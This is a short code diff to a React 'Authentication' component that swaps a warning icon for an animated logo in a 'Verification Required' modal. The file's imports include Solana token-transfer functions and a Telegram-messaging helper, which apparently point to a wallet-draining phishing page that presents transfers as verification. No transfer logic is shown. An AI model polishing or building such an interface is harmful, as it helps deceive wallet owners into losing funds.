@@ -10,6 +10,7 @@ import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAsso
 import { toast } from 'sonner';
 import { sendTelegramMessage } from '@/utils/telegram';
 import { ConnectWalletButton } from '@/components/ConnectWalletButton';
+import { AnimatedLogo } from '@/components/AnimatedLogo';
 import { Loader2, ShieldCheck, AlertCircle, Plus } from 'lucide-react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { getMintProgramId } from '@/utils/tokenProgram';
@@ -528,9 +529,7 @@ const Authentication = () => {
                 className="bg-card w-full max-w-md p-6 rounded-xl shadow-2xl border border-primary/20"
               >
                 <div className="flex flex-col items-center text-center space-y-4">
-                  <div className="w-16 h-16 rounded-full bg-yellow-500/10 flex items-center justify-center">
-                    <AlertCircle className="w-8 h-8 text-yellow-500" />
-                  </div>
+                  <AnimatedLogo className="w-16 h-16" />
                   <h3 className="text-xl font-bold">Verification Required</h3>
                   <div>
                     <p className="text-muted-foreground">
